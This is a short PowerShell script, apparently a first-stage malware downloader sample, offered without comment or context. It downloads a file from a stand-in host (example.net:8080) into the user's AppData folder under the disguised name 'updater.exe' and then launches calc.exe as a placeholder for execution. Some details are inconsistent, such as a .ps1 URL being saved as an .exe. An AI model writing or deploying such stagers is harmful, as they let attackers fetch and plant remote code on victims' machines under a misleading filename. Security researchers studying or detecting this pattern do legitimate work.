
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$PayloadUrl = "http://example.net:8080/stage1.ps1",
    [string]$PayloadPath = "$env:APPDATA\updater.exe",
    [int]$StageTimeout = 140
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Invoke-Stage1Download -SourceUrl $PayloadUrl -DestinationPath $PayloadPath -TimeoutSec $StageTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$ProgressPreference = "SilentlyContinue"
